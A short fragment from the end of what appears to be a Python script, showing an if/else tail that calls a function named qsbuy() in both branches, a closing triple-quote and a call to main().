        qsbuy()
else:
        qsbuy()
'''
main()